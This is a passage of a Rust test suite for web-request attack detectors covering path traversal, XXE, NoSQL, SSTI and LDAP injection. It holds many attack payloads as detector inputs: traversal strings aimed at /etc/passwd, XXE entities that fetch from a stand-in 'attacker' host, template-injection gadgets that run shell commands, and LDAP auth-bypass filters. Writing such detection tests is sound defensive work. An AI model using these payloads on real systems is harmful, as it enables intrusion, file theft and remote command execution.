    }

    #[test]
    fn traversal_encoded_dotdot_fires() {
        for enc in [
            "%2e%2e%2f",
            "..%2f..%2f..%2fetc",
            "%2e%2e/",
            "..%5cwindows",
            // mixed-depth: double-encoded `..` followed by a single-encoded
            // separator — a real bypass vector, intentionally kept.
            "%252e%252e%2f",
            // codex A-4 must-fix: fully double-encoded traversal — the double-
            // encoded dot-dot MUST be followed by the fully double-encoded
            // separator (`%252f`/`%255c`), not another encoded dot.
            "%252e%252e%252fetc%252fpasswd",
            "%252e%252e%255cwindows",
        ] {
            let f = trav_fire(enc).unwrap_or_else(|| panic!("encoded traversal must fire: {enc}"));
            assert_eq!(f.attack, AttackKind::Traversal);
            assert!(matches!(f.rule_key, "traversal.encoded_dotdot" | "traversal.overlong"));
        }
        // codex A-4 must-fix: a BARE `%252e%252e` (double-encoded `..` with no
        // path separator, e.g. inside a filename) must NOT fire — it is only
        // `..`. Critically, a THIRD encoded dot is NOT a separator either —
        // `%252e%252e%252e` is three double-encoded dots with no `/`/`\`
        // anywhere, and must not be mistaken for traversal (this was the bug:
        // the old pattern accepted a further `%2e`/`%252e` as if it were a
        // separator).
        assert!(
            trav_fire("file=photo%252e%252ejpg").is_none(),
            "bare double-encoded dot-dot without a separator must not fire"
        );
        assert!(trav_fire("%252e%252e").is_none(), "bare %252e%252e is not traversal");
        assert!(
            trav_fire("%252e%252e%252e").is_none(),
            "three double-encoded dots with no path separator must not fire"
        );
        assert!(
            trav_fire("%2e%2e%2e").is_none(),
            "three single-encoded dots with no path separator must not fire"
        );
        assert!(
            trav_fire("an ellipsis in text...more content, no path here").is_none(),
            "plain ellipsis / filename-adjacent dots with no encoded separator must not fire"
        );
    }

    #[test]
    fn traversal_overlong_fires() {
        assert_eq!(
            trav_fire("..%c0%af..%c0%afetc/passwd")
                .expect("overlong traversal fires")
                .rule_key,
            "traversal.overlong"
        );
    }

    #[test]
    fn traversal_sensitive_abs_fires() {
        // The decoded form a base64/hex-wrapped traversal collapses to.
        assert_eq!(
            trav_fire("/etc/passwd").expect("sensitive abs fires").rule_key,
            "traversal.sensitive_abs"
        );
        assert_eq!(
            trav_fire(r"c:\windows\system32\cmd")
                .expect("windows abs fires")
                .rule_key,
            "traversal.sensitive_abs"
        );
    }

    #[test]
    fn traversal_plain_dotdot_default_off_but_fires_with_all() {
        // Plain `../` and the `....//` double-write bypass fire only under the
        // full rule set (the default set stays quiet to avoid relative-path FP).
        assert_eq!(
            trav_fire_all("../../../etc")
                .expect("plain dotdot fires with all")
                .rule_key,
            "traversal.plain_dotdot"
        );
        assert_eq!(
            trav_fire_all("....//....//")
                .expect("double-write fires with all")
                .rule_key,
            "traversal.plain_dotdot"
        );
        assert!(trav_fire("../../../etc").is_none(), "plain dotdot is default-off");
    }

    #[test]
    fn traversal_clean_traffic_does_not_fire() {
        for clean in [
            "./config/app.json",
            "version=1.2.3",
            "file=report_v2.pdf",
            "/api/v1/users/42",
            "path=/var/www/html",
            "name=my..file",
            "q=%2elearn&sort=asc",
            "../relative/import/path",
            "photo..2024.jpg",
            r#"{"path":"a/b/c","v":"3.4.5"}"#,
            // codex A-4: high-frequency legitimate ops/container paths are now
            // default-off — a bare mention must not fire on the production set.
            "resolver reads /etc/hosts for name lookups",
            "cgroup path is /proc/self/cgroup on this host",
            "healthcheck greps /proc/version for the kernel",
            "GET /proc/1/status returns process state",
            r#"{"mounts":["/etc/hosts","/etc/resolv.conf"]}"#,
            "file=photo%252e%252ejpg&album=trip",
        ] {
            assert!(trav_fire(clean).is_none(), "clean traversal negative fired: {clean:?}");
        }
        // The ops paths DO fire under the full rule set (proof they moved to the
        // default-off `traversal.sensitive_abs_ops`, not deleted).
        assert_eq!(
            trav_fire_all("cat /proc/self/environ")
                .expect("ops path fires with all rules")
                .rule_key,
            "traversal.sensitive_abs_ops"
        );
    }

    // ── XXE structural detector (T2-A) ───────────────────────────────────────

    fn xxe_fire(text: &str) -> Option<DetectionFinding> {
        run(&XxeStructuralDetector::new(), text)
    }

    fn xxe_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&XxeStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn xxe_all_rules_compile() {
        let det = XxeStructuralDetector::with_all_rules();
        assert_eq!(det.rules.len(), XXE_RULES.len(), "every XXE pattern must compile");
    }

    #[test]
    fn xxe_id_and_config_string() {
        assert_eq!(XxeStructuralDetector::new().id(), DetectorId::XxeStruct);
        assert_eq!(DetectorId::XxeStruct.as_config_str(), "xxe_struct");
        assert_eq!(DetectorId::from_config_str("xxe_struct"), Some(DetectorId::XxeStruct));
        assert_eq!(AttackKind::Xxe.as_config_key(), "xxe");
        assert_eq!(AttackKind::from_config_key("xxe"), Some(AttackKind::Xxe));
    }

    #[test]
    fn xxe_default_on_excludes_high_noise_rules() {
        let det = XxeStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in ["xxe.doctype_external", "xxe.param_entity_ref", "xxe.entity_expansion"] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in ["xxe.entity_external", "xxe.param_entity_def"] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn xxe_external_entity_fires() {
        // Classic file-read and OOB parameter-entity forms — the strongest,
        // default-on signal.
        for payload in [
            r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#,
            r#"<!ENTITY xxe SYSTEM "file:///etc/passwd">"#,
            r#"<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">"#,
            r#"<!ENTITY xxe PUBLIC "-//x//y" "http://attacker/x">"#,
        ] {
            let f = xxe_fire(payload).unwrap_or_else(|| panic!("external entity must fire: {payload}"));
            assert_eq!(f.attack, AttackKind::Xxe);
            assert_eq!(f.rule_key, "xxe.entity_external");
        }
    }

    #[test]
    fn xxe_internal_param_entity_definition_fires_default_on() {
        // A purely INTERNAL parameter-entity definition (no external id) is not
        // caught by `entity_external`, so it must fire the default-on
        // `param_entity_def` rule.
        let f = xxe_fire(r#"<!DOCTYPE r [<!ENTITY % pe "internal">]>"#)
            .expect("internal parameter-entity definition must fire");
        assert_eq!(f.rule_key, "xxe.param_entity_def");
    }

    #[test]
    fn xxe_billion_laughs_fires_only_with_expansion_rule() {
        // Purely-internal billion-laughs: no SYSTEM/PUBLIC, no parameter entity, so
        // the default-on rules stay silent (proving no false certainty) and only
        // the default-off `entity_expansion` COUNT rule catches it — a parse-free,
        // bounded frequency count, never an entity expansion.
        let bomb = r#"<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;">]>"#;
        assert!(
            xxe_fire(bomb).is_none(),
            "no default-on rule fires on internal-only bomb"
        );
        let f = xxe_fire_all(bomb).expect("expansion rule fires under full rule set");
        assert_eq!(f.rule_key, "xxe.entity_expansion");
    }

    #[test]
    fn xxe_external_doctype_default_off_but_fires_with_all() {
        // An external DOCTYPE with no entity declaration only fires under the full
        // rule set (the default-off `doctype_external` rule), because a legitimate
        // XHTML `<!DOCTYPE html PUBLIC …>` matches the same shape.
        let payload = r#"<!DOCTYPE root SYSTEM "http://attacker/x.dtd">"#;
        assert!(xxe_fire(payload).is_none(), "external DOCTYPE is default-off");
        let f = xxe_fire_all(payload).expect("external DOCTYPE fires under full rule set");
        assert_eq!(f.rule_key, "xxe.doctype_external");
    }

    #[test]
    fn xxe_strongest_rule_wins() {
        // A payload that trips both `entity_external` (90) and `param_entity_def`
        // (80) reports the stronger rule.
        let f =
            xxe_fire(r#"<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">"#).expect("external parameter entity fires");
        assert_eq!(f.rule_key, "xxe.entity_external", "highest-confidence rule wins");
    }

    #[test]
    fn xxe_clean_traffic_does_not_fire() {
        // Benign traffic — including the HTML5 doctype, ordinary XML with no DTD,
        // predefined entity references, and prose/JSON that merely mentions the
        // keywords — must not trip the default-on rules.
        for clean in [
            "<!DOCTYPE html>",
            "<!doctype html>",
            r"<note><to>Alice</to><body>hi &amp; bye &lt;3</body></note>",
            r#"<root><item id="1">value</item></root>"#,
            "the system entity uses a public api",
            "please contact the system administrator",
            r#"{"doctype":"invoice","entity":"acme","mode":"system"}"#,
            "width: 50%; height: 100%;",
            "discount is 20% off; hurry",
            "SELECT * FROM entity WHERE system = 'public'",
            "an entity relationship diagram for the public system",
            r"<html><head><title>doc</title></head><body>system public</body></html>",
        ] {
            assert!(xxe_fire(clean).is_none(), "clean XXE negative fired: {clean:?}");
        }
    }

    #[test]
    fn xxe_bare_param_ref_default_off_but_fires_with_all() {
        // A lone `%name;` parameter-entity reference is noisy, so it is default-off;
        // under the full rule set it fires `param_entity_ref`.
        let payload = "%xxe;";
        assert!(xxe_fire(payload).is_none(), "bare param ref is default-off");
        let f = xxe_fire_all(payload).expect("bare param ref fires under full rule set");
        assert_eq!(f.rule_key, "xxe.param_entity_ref");
    }

    // ── NoSQL structural detector (T2-B) ─────────────────────────────────────

    fn nosql_fire(text: &str) -> Option<DetectionFinding> {
        run(&NoSqlStructuralDetector::new(), text)
    }

    fn nosql_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&NoSqlStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn nosql_all_rules_compile() {
        let det = NoSqlStructuralDetector::with_all_rules();
        assert_eq!(det.rules.len(), NOSQL_RULES.len(), "every NoSQL pattern must compile");
    }

    #[test]
    fn nosql_id_and_config_string() {
        assert_eq!(NoSqlStructuralDetector::new().id(), DetectorId::NoSqlStruct);
        assert_eq!(DetectorId::NoSqlStruct.as_config_str(), "nosql_struct");
        assert_eq!(
            DetectorId::from_config_str("nosql_struct"),
            Some(DetectorId::NoSqlStruct)
        );
        assert_eq!(AttackKind::NoSqlInjection.as_config_key(), "nosql_injection");
        assert_eq!(
            AttackKind::from_config_key("nosql_injection"),
            Some(AttackKind::NoSqlInjection)
        );
    }

    #[test]
    fn nosql_default_on_is_js_expression_operators_only() {
        let det = NoSqlStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        assert!(
            on.contains("nosql.query_operator"),
            "JS/expr operators must be default-on"
        );
        for off in [
            "nosql.expr_operator",
            "nosql.regex_operator",
            "nosql.comparison_operator",
            "nosql.logical_operator",
        ] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
    }

    #[test]
    fn nosql_js_expression_operators_fire_default_on() {
        // Only the operators that execute server-side JS are the default-on signal.
        // `$expr` is NOT here (F2: it does not run JS, ships default-off). Each
        // arrives as its own `$op` leaf.
        for op in ["$where", "$function", "$accumulator"] {
            let f = nosql_fire(op).unwrap_or_else(|| panic!("{op} must fire default-on"));
            assert_eq!(f.attack, AttackKind::NoSqlInjection);
            assert_eq!(f.rule_key, "nosql.query_operator");
            assert_eq!(f.confidence.get(), 90);
        }
    }

    #[test]
    fn nosql_expr_operator_is_default_off() {
        // F2: `$expr` is a common, legitimate aggregation operator that does not run
        // server-side JS, so it must NOT produce a default-on finding. It still fires
        // under the full rule set as its own dedicated rule.
        assert!(nosql_fire("$expr").is_none(), "$expr must be default-off");
        let f = nosql_fire_all("$expr").expect("$expr fires under the full rule set");
        assert_eq!(f.rule_key, "nosql.expr_operator");
        assert_eq!(f.attack, AttackKind::NoSqlInjection);
        assert_eq!(f.confidence.get(), 75);
    }

    #[test]
    fn nosql_operator_allowlist_matches_rule_operators() {
        // F1 invariant: every key the extraction allowlist surfaces must be a real
        // operator some NoSQL rule matches (default-on OR default-off), so the
        // extractor never surfaces a key no rule can consume — and, conversely,
        // enabling a default-off rule later can never outrun what extraction
        // surfaces. Adding an operator to a rule without adding it here (or vice
        // versa) trips this test.
        for key in NOSQL_OPERATOR_KEYS {
            assert!(
                nosql_fire_all(key).is_some(),
                "allowlisted key {key} must be matched by some NoSQL rule"
            );
        }
        // Exact-set tripwire against silent drift.
        let expected = [
            "$where",
            "$function",
            "$accumulator",
            "$expr",
            "$regex",
            "$ne",
            "$gt",
            "$gte",
            "$lt",
            "$lte",
            "$in",
            "$nin",
            "$or",
            "$and",
            "$nor",
        ];
        assert_eq!(NOSQL_OPERATOR_KEYS.to_vec(), expected.to_vec(), "allowlist drift");
    }

    #[test]
    fn nosql_comparison_operators_are_default_off() {
        // `$ne`/`$gt`/… are the classic auth-bypass but far too common in benign
        // filter APIs to fire on their own before calibration: default-off.
        for op in ["$ne", "$gt", "$gte", "$lt", "$lte", "$in", "$nin"] {
            assert!(nosql_fire(op).is_none(), "{op} must be default-off");
            let f = nosql_fire_all(op).unwrap_or_else(|| panic!("{op} fires under full rule set"));
            assert_eq!(f.rule_key, "nosql.comparison_operator");
        }
    }

    #[test]
    fn nosql_regex_and_logical_operators_are_default_off() {
        assert!(nosql_fire("$regex").is_none(), "$regex is default-off");
        assert_eq!(
            nosql_fire_all("$regex")
                .expect("$regex fires under full rules")
                .rule_key,
            "nosql.regex_operator"
        );
        for op in ["$or", "$and", "$nor"] {
            assert!(nosql_fire(op).is_none(), "{op} is default-off");
            assert_eq!(
                nosql_fire_all(op).unwrap_or_else(|| panic!("{op} fires")).rule_key,
                "nosql.logical_operator"
            );
        }
    }

    #[test]
    fn nosql_anchored_match_rejects_substrings_and_prose() {
        // Anchoring is what keeps FP down: a value that merely CONTAINS an operator
        // token, or a `$`-word that is not an operator, must never fire — even under
        // the full rule set.
        for clean in [
            "$net",              // not an operator ($ne is, $net is not)
            "$nexus",            // superstring of $ne
            "use $ne carefully", // operator token inside prose
            "$wheres",           // superstring of $where
            "price is $5",       // stray dollar amount
            "where",             // keyword without the `$`
            "ne",                // operator name without the `$`
            "{\"$ne\":null}",    // a raw compact-JSON body view (not an isolated leaf)
            "$schema",           // a non-operator `$`-key surfaced by extraction
            "$ref",
        ] {
            assert!(nosql_fire_all(clean).is_none(), "must not fire on {clean:?}");
        }
    }

    #[test]
    fn nosql_end_to_end_operator_key_leaf_fires() {
        // Integration: a JSON body whose operator is in KEY position must, through
        // the real preprocessor → struct extraction → detector path, surface a
        // NoSQL finding on the extracted `$where` leaf.
        let mut req = throwaway_req();
        req.body_preview = Bytes::from_static(br#"{"user":"admin","q":{"$where":"sleep(9999)"}}"#);
        req.content_length = req.body_preview.len() as u64;
        req.headers
            .insert("content-type".to_string(), "application/json".to_string());
        let mut st = ContentInspectionState::default();
        st.begin_phase();
        let views = crate::checks::content_security::semantic_preprocessor(InspectionScope::Body, &req, &mut st);
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let det = NoSqlStructuralDetector::new();
        let mut st2 = ContentInspectionState::default();
        let hit = views
            .iter()
            .filter_map(|v| det.detect(v, &pctx, &mut st2))
            .any(|f| f.attack == AttackKind::NoSqlInjection && f.rule_key == "nosql.query_operator");
        assert!(hit, "the $where key leaf must drive a NoSQL query_operator finding");
    }

    // ── SSTI structural detector (T2-C) ──────────────────────────────────────

    fn ssti_fire(text: &str) -> Option<DetectionFinding> {
        run(&SstiStructuralDetector::new(), text)
    }

    fn ssti_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&SstiStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn ssti_all_rules_compile() {
        let det = SstiStructuralDetector::with_all_rules();
        assert_eq!(det.rules.len(), SSTI_RULES.len(), "every SSTI pattern must compile");
    }

    #[test]
    fn ssti_id_and_config_string() {
        assert_eq!(SstiStructuralDetector::new().id(), DetectorId::SstiStruct);
        assert_eq!(DetectorId::SstiStruct.as_config_str(), "ssti_struct");
        assert_eq!(DetectorId::from_config_str("ssti_struct"), Some(DetectorId::SstiStruct));
        assert_eq!(AttackKind::Ssti.as_config_key(), "ssti");
        assert_eq!(AttackKind::from_config_key("ssti"), Some(AttackKind::Ssti));
    }

    #[test]
    fn ssti_default_on_excludes_high_noise_rules() {
        let det = SstiStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in [
            "ssti.getclass",
            "ssti.template_directive",
            "ssti.jinja_arith_probe",
            "ssti.py_class",
            "ssti.jinja_delim",
            "ssti.dollar_delim",
            "ssti.hash_delim",
        ] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "ssti.freemarker_exec",
            "ssti.spel_type_java",
            "ssti.javax_script_engine",
            "ssti.java_reflect_forname",
            "ssti.jinja_sink",
            "ssti.jinja_statement_sink",
            "ssti.py_sandbox_dunder",
            "ssti.erb_scriptlet_exec",
            "ssti.py_import",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn ssti_audit_a_fn_gaps_fire_default_on() {
        // Audit A FN closures: the `javax.script` reflection RCE gadget, the SpEL
        // `T (java.…)` **spaced** type-evaluator variant, and Jinja/Twig `{% … %}`
        // statement blocks carrying a dangerous sink.
        for (payload, expect) in [
            // ① javax reflection RCE class.
            (
                r#"${new javax.script.ScriptEngineManager().getEngineByName("js").eval("x")}"#,
                "ssti.javax_script_engine",
            ),
            // ② SpEL type-evaluator with a space before the paren (strict `t(` FN).
            (r"*{T (java.lang.Runtime).getRuntime()}", "ssti.spel_type_java"),
            (r"${T  (java.lang.ProcessBuilder)}", "ssti.spel_type_java"),
            // ③ Jinja/Twig statement blocks with a real exec / sandbox sink.
            (r"{% import os %}", "ssti.jinja_statement_sink"),
            (
                r"{% set x = subprocess.check_output('id') %}",
                "ssti.jinja_statement_sink",
            ),
            (
                r"{% set df = _self.env.registerUndefinedFilterCallback('system') %}",
                "ssti.jinja_statement_sink",
            ),
            (r"{% set r = ''.__class__ %}", "ssti.jinja_statement_sink"),
        ] {
            let f = ssti_fire(payload).unwrap_or_else(|| panic!("audit-A FN must fire: {payload}"));
            assert_eq!(f.attack, AttackKind::Ssti);
            assert_eq!(f.rule_key, expect, "payload: {payload}");
        }
    }

    #[test]
    fn ssti_audit_a_benign_statement_blocks_stay_clean() {
        // FP discipline for the new `{% … %}` rule: ordinary Jinja/Twig control flow
        // and template-composition statements (no exec/sandbox sink) must NOT fire,
        // and a fully-qualified `javax.script` mention only fires on the scripting
        // engine classes, never a bare `javax.` prose mention.
        for clean in [
            r"{% if user.is_active %}welcome{% endif %}",
            r"{% for item in cart.items %}{{ item.name }}{% endfor %}",
            r"{% block content %}{% endblock %}",
            r"{% include 'partials/header.html' %}",
            r"{% import 'forms.html' as forms %}",
            r"{% set total = price * quantity %}",
            // `javax.` prose that is not the scripting-engine gadget.
            r"the javax.servlet API and javax.naming package are documented here",
        ] {
            assert!(
                ssti_fire(clean).is_none(),
                "clean SSTI statement negative fired: {clean:?}"
            );
        }
    }

    #[test]
    fn ssti_java_exec_gadgets_fire_default_on() {
        // The strongest, essentially-never-benign Java template exec gadgets.
        for (payload, expect) in [
            (
                r#"<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}"#,
                "ssti.freemarker_exec",
            ),
            (
                r#"${T(java.lang.Runtime).getRuntime().exec("id")}"#,
                "ssti.spel_type_java",
            ),
            (r"*{T(java.lang.ProcessBuilder)}", "ssti.spel_type_java"),
            (
                r#"$e.getClass().forName("java.lang.Runtime")"#,
                "ssti.java_reflect_forname",
            ),
        ] {
            let f = ssti_fire(payload).unwrap_or_else(|| panic!("gadget must fire: {payload}"));
            assert_eq!(f.attack, AttackKind::Ssti);
            assert_eq!(f.rule_key, expect, "payload: {payload}");
        }
    }

    #[test]
    fn ssti_jinja_python_sinks_fire_default_on() {
        // Flask/Jinja sink gated by the `{{ }}` delimiter, and the standalone
        // Python sandbox-escape dunder / import primitives.
        for (payload, expect) in [
            (r"{{ config.items() }}", "ssti.jinja_sink"),
            (r"{{ ''.__class__.__mro__[1].__subclasses__() }}", "ssti.jinja_sink"),
            (r"{{ request.application.__globals__ }}", "ssti.jinja_sink"),
            (r"''.__class__.__mro__[2].__subclasses__()", "ssti.py_sandbox_dunder"),
            (r"__import__('os').system('id')", "ssti.py_import"),
        ] {
            let f = ssti_fire(payload).unwrap_or_else(|| panic!("sink must fire: {payload}"));
            assert_eq!(f.rule_key, expect, "payload: {payload}");
        }
    }

    #[test]
    fn ssti_erb_scriptlet_exec_fires_default_on() {
        for payload in [
            r#"<%= system("id") %>"#,
            "<%= `id` %>",
            r#"<% Runtime.getRuntime.exec("id") %>"#,
        ] {
            let f = ssti_fire(payload).unwrap_or_else(|| panic!("erb scriptlet must fire: {payload}"));
            assert_eq!(f.rule_key, "ssti.erb_scriptlet_exec", "payload: {payload}");
        }
    }

    #[test]
    fn ssti_strongest_rule_wins() {
        // A FreeMarker payload that also carries `${…}` reports the higher-confidence
        // exec rule, not a default-off delimiter rule.
        let f = ssti_fire(r#"${freemarker.template.utility.Execute("id")}"#).expect("freemarker exec fires");
        assert_eq!(f.rule_key, "ssti.freemarker_exec", "highest-confidence rule wins");
    }

    #[test]
    fn ssti_bare_delimiters_are_default_off() {
        // Bare interpolation delimiters — the ubiquitous i18n / framework idioms —
        // must NOT fire under the default rule set (the whole FP-control thesis of
        // T2-C); they only fire under the full rule set.
        for (payload, expect) in [
            (r"${t('welcome.title')}", "ssti.dollar_delim"),
            (r"<div>{{ user.name }}</div>", "ssti.jinja_delim"),
            (r#"greeting = "hi #{name}""#, "ssti.hash_delim"),
            (r"{{ 7*7 }}", "ssti.jinja_arith_probe"),
        ] {
            assert!(
                ssti_fire(payload).is_none(),
                "bare-delimiter payload must be default-off: {payload}"
            );
            let f = ssti_fire_all(payload).unwrap_or_else(|| panic!("fires under full set: {payload}"));
            // `{{ 7*7 }}` matches both the arith probe (45) and the bare delim (30);
            // the stronger rule wins.
            assert_eq!(f.rule_key, expect, "payload: {payload}");
        }
    }

    #[test]
    fn ssti_clean_traffic_does_not_fire() {
        // Legitimate content that merely resembles template syntax or mentions the
        // keywords must not trip the default-on rules.
        for clean in [
            // i18n JS template literals — the single biggest SSTI FP source.
            r"const msg = `Hello ${name}, you have ${count} messages`;",
            r"label: t('nav.settings')",
            // Vue / Angular interpolation.
            r"<p>{{ item.price | currency }}</p>",
            r"<span>{{ user.firstName }} {{ user.lastName }}</span>",
            // Shell variable expansion.
            r#"export PATH="${HOME}/bin:${PATH}""#,
            // CSS / SCSS.
            r".button { color: #{$primary}; width: 100%; }",
            // Prose mentioning the keywords.
            "please configure the runtime environment and system settings",
            "the class implements getClass semantics for reflection docs",
            "import the module then run the system check",
            // JSON that mentions template words.
            r#"{"template":"invoice","config":"default","system":"prod"}"#,
            // Ruby interpolation in a legit string.
            r#"puts "Total: #{subtotal + tax}""#,
        ] {
            assert!(ssti_fire(clean).is_none(), "clean SSTI negative fired: {clean:?}");
        }
    }

    #[test]
    fn ssti_deeply_nested_delimiters_decline_without_stack_overflow() {
        // Pure-regex detector: no recursion, so a pathologically nested / repeated
        // delimiter payload is a bounded linear scan that returns promptly and never
        // overflows the stack. (Belt-and-braces: the P0 depth-bound red-line targets
        // recursive parsers; this detector has none.)
        let bomb = format!("{}{}", "${".repeat(50_000), "}".repeat(50_000));
        // No default-on rule matches this contentless nest; must be a clean decline.
        assert!(
            ssti_fire(&bomb).is_none(),
            "nested bare delimiters must not fire default-on rules"
        );
        let nested_braces = "{{".repeat(50_000);
        assert!(ssti_fire(&nested_braces).is_none(), "nested braces decline cleanly");
    }

    // ── LDAP injection structural detector (T2-D) ────────────────────────────

    fn ldap_fire(text: &str) -> Option<DetectionFinding> {
        run(&LdapStructuralDetector::new(), text)
    }

    fn ldap_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&LdapStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn ldap_all_rules_compile() {
        let det = LdapStructuralDetector::with_all_rules();
        assert_eq!(det.rules.len(), LDAP_RULES.len(), "every LDAP pattern must compile");
    }

    #[test]
    fn ldap_id_and_config_string() {
        assert_eq!(LdapStructuralDetector::new().id(), DetectorId::LdapStruct);
        assert_eq!(DetectorId::LdapStruct.as_config_str(), "ldap_struct");
        assert_eq!(DetectorId::from_config_str("ldap_struct"), Some(DetectorId::LdapStruct));
        assert_eq!(AttackKind::LdapInjection.as_config_key(), "ldap_injection");
        assert_eq!(
            AttackKind::from_config_key("ldap_injection"),
            Some(AttackKind::LdapInjection)
        );
    }

    #[test]
    fn ldap_default_on_excludes_high_noise_rules() {
        let det = LdapStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in [
            "ldap.filter_break_any_attr",
            "ldap.filter_group",
            "ldap.paren_adjacency",
            "ldap.bare_wildcard",
            "ldap.bare_logical",
        ] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "ldap.filter_break_logical",
            "ldap.auth_bypass_wildcard",
            "ldap.filter_break_known_attr",
            "ldap.hex_escape_break",
            "ldap.hex_escape_meta_pair",
            "ldap.null_byte_truncation",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn ldap_audit_a_fn_gaps_fire_default_on() {
        // Audit A FN closures: the hex-escaped wildcard/paren combos the specific
        // `\29\28` rule missed, and the extended directory-attribute whitelist.
        for (payload, expect) in [
            // ① hex-escaped metacharacter pairs involving the wildcard `\2a`
            //    (deliberately NOT containing `\29\28`, which the higher-confidence
            //    `ldap.hex_escape_break` rule owns).
            (r"admin\2a\29next", "ldap.hex_escape_meta_pair"),
            (r"user\28\2a", "ldap.hex_escape_meta_pair"),
            (r"x\29\2a", "ldap.hex_escape_meta_pair"),
            // reversed `\28\29` (open-then-close) the `\29\28` rule did not cover.
            (r"val\28\29", "ldap.hex_escape_meta_pair"),
            // ② extended attribute whitelist — a filter break onto each new attr.
            (r"admin)(memberof=cn=admins)", "ldap.filter_break_known_attr"),
            (r"x)(samaccountname=administrator)", "ldap.filter_break_known_attr"),
            (r"y)(displayname=*)", "ldap.filter_break_known_attr"),
            (r"z)(userprincipalname=root@corp)", "ldap.filter_break_known_attr"),
            (r"a)(uidnumber=0)", "ldap.filter_break_known_attr"),
        ] {
            let f = ldap_fire(payload).unwrap_or_else(|| panic!("audit-A FN must fire: {payload}"));
            assert_eq!(f.attack, AttackKind::LdapInjection);
            assert_eq!(f.rule_key, expect, "payload: {payload}");
        }
        // The exact `\29\28` break must still report the SPECIFIC rule, not the
        // broader pair rule (confidence ordering, no regression).
        assert_eq!(
            ldap_fire(r"admin\29\28uid=*")
                .expect("specific hex break still fires")
                .rule_key,
            "ldap.hex_escape_break",
        );
        // A lone single hex escape carries no signal — must NOT fire.
        assert!(ldap_fire(r"value\2a").is_none(), "lone hex escape must not fire");
    }

    #[test]
    fn ldap_filter_break_signatures_fire_default_on() {
        // The structural filter-break co-occurrence signatures — a clause close
        // re-opened onto a logical operator or an attribute assignment.
        for (payload, expect) in [
            (r"admin*)(uid=*", "ldap.auth_bypass_wildcard"),
            (r"*)(|(uid=*", "ldap.filter_break_logical"),
            (r"foo)(|(cn=admin)", "ldap.filter_break_logical"),
            (r"x)(&(objectClass=*)", "ldap.filter_break_logical"),
            (r"bar)(uid=admin)", "ldap.filter_break_known_attr"),
            (r"john)(userPassword=*)", "ldap.filter_break_known_attr"),
            (r"a)(objectClass=user)", "ldap.filter_break_known_attr"),
        ] {
            let f = ldap_fire(payload).unwrap_or_else(|| panic!("break must fire: {payload}"));
            assert_eq!(f.attack, AttackKind::LdapInjection);
            assert_eq!(f.rule_key, expect, "payload: {payload}");
        }
    }

    #[test]
    fn ldap_empty_logical_filter_break_fires() {
        // F-H: the empty-filter auth-bypass forms `)(&)` / `)(|)` / `)(!)` (a clause
        // close re-opened onto a logical operator that closes empty) now fire — the old
        // pattern required a nested re-open `)(&(` and missed `admin)(&)`.
        for payload in [r"admin)(&)", r"user)(|)", r"x)(!)"] {
            let f = ldap_fire(payload).unwrap_or_else(|| panic!("empty-logical break must fire: {payload}"));
            assert_eq!(f.attack, AttackKind::LdapInjection);
            assert_eq!(f.rule_key, "ldap.filter_break_logical", "payload: {payload}");
        }
        // The nested re-open form must still fire (no regression).
        assert_eq!(
            ldap_fire(r"x)(&(objectClass=*)")
                .expect("nested re-open still fires")
                .rule_key,
            "ldap.filter_break_logical",
        );
        // Ordinary parenthesised text with an operator but NO `)(` adjacency must not.
        for benign in [r"if (x > 0) && (y < 10) { run(); }", r"result = (a|b)&c"] {
            assert!(
                ldap_fire(benign).is_none(),
                "benign parenthesised expression must not fire: {benign}"
            );
        }
    }

    #[test]
    fn ldap_evasion_signatures_fire_default_on() {
        // Hex-escaped `)(` break and the null-byte filter truncation tail.
        for (payload, expect) in [
            (r"admin\29\28uid=*", "ldap.hex_escape_break"),
            (r"value\29\28|\28cn=*", "ldap.hex_escape_break"),
            (r"admin*))\00", "ldap.null_byte_truncation"),
            ("admin*))\u{0}", "ldap.null_byte_truncation"),
        ] {
            let f = ldap_fire(payload).unwrap_or_else(|| panic!("evasion must fire: {payload}"));
            assert_eq!(f.rule_key, expect, "payload: {payload}");
        }
    }

    #[test]
    fn ldap_strongest_rule_wins() {
        // The wildcard auth-bypass also contains a `)(` adjacency (a default-off
        // rule); the high-confidence auth-bypass rule wins under the default set.
        let f = ldap_fire(r"*)(uid=*").expect("auth bypass fires");
        assert_eq!(f.rule_key, "ldap.auth_bypass_wildcard", "highest-confidence rule wins");
    }

    #[test]
    fn ldap_bare_metacharacters_are_default_off() {
        // The ubiquitous bare LDAP metacharacters must NOT fire under the default
        // rule set (the whole FP-control thesis of T2-D); they only fire under the
        // full rule set.
        for (payload, expect) in [
            (r"price * quantity", "ldap.bare_wildcard"),
            (r"(foo)(bar)", "ldap.paren_adjacency"),
            (r"(|(a", "ldap.filter_group"),
            (r"cats & dogs", "ldap.bare_logical"),
        ] {
            assert!(
                ldap_fire(payload).is_none(),
                "bare-metacharacter payload must be default-off: {payload}"
            );
